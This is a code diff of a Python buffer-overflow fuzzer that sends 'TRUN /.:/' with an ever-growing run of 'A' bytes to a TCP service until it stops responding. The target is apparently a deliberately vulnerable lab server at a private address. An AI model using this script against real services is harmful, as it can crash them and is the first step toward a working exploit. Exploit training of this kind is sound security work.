@@ -1,23 +1,40 @@
 import socket
-from print_color import print
-import datetime
 
 
-def fuzz():
+def fuzz(host, port):
     buffersize = 0
-    while buffersize <= 65536:
-        buffersize += 10
+    try:
+        while buffersize <= 65536:
+            buffer = b"".join([
+                b"TRUN",
+                b" ",
+                b"/.:/",
+                b"A" * buffersize
+            ])
 
-        datetimeformat = "".join([
-            "[",
-            datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S"),
-            "]"
-        ])
+            sock = socket.socket(
+                socket.AF_INET,
+                socket.SOCK_STREAM
+            )
+            sock.settimeout(1)
 
-        print(
-            datetimeformat,
-            "Transmiting {} bytes".format(buffersize),
-            color="blue"
-        )
+            sock.connect((host, port))
 
-# fuzz()
+            sock.send(buffer)
+            print(
+                "Transmiting {} bytes: {}".format(buffersize, buffer)
+            )
+
+            sock.close()
+            buffersize += 10
+
+    except socket.error:
+        if buffersize == 0:
+            print("Couldn't connect to socket")
+
+        else:
+            print(
+                "Socket reached end of life around {} bytes".format(buffersize)
+            )
+
+# fuzz("192.168.31.128", 9999)
